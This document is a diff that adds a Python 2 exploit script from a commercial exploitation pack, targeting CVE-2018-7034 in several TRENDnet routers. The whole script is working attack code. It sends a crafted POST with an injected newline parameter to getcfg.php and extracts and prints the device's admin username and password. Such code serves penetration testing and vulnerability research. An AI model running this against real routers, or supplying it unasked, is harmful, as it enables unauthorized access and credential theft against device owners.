@@ -1,0 +1,52 @@
+#! /usr/bin/env python2
+ 
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2018
+#
+
+###
+# STD modules
+###
+from HTMLParser import HTMLParser
+
+import os, sys, re
+import requests
+
+_name_   = 'd2sec_trendnet_1'
+_vendor_ = 'trendnet'
+_model_  = ['TEW-751DR','TEW-752DRU','TEW733GR']
+_vuln_   = 'Credentials Disclosure Vulnerability'
+_cve_    = 'CVE-2018-7034'
+_ref_    = 'https://blogs.securiteam.com/index.php/archives/3627'
+_port_   = 8080
+
+def pwnrouter(host,port=_port_):
+  try:
+    url = 'http://%s:%d/getcfg.php' % (host,port)    
+    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
+    data = 'SERVICES=DEVICE.ACCOUNT%0aAUTHORIZED_GROUP=1'
+    response = requests.post(url, headers=headers, data=data)
+  except Exception, e:
+    print '[-] error : %s' % e
+    return
+  if response is None:
+    print '[+] %s not vulnerable' % host
+  if '<password>' in response.text:
+    print '[+] %s vulnerable\n' % host
+    m = re.search('<name>(.+?)</name>.*?<password>(.+?)</password>', response.text, re.DOTALL)
+    if m is None:
+      print '[+] Credentials not found'
+      print response.text        
+    else:       
+      h = HTMLParser()     
+      print 'Login: %s\nPassword: %s\n'%(h.unescape(m.group(1)),h.unescape(m.group(2)))
+      print '===\n\n%s'%response.text
+  else:            
+    print '[+] %s not vulnerable' % host
+
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1], int(sys.argv[2]))
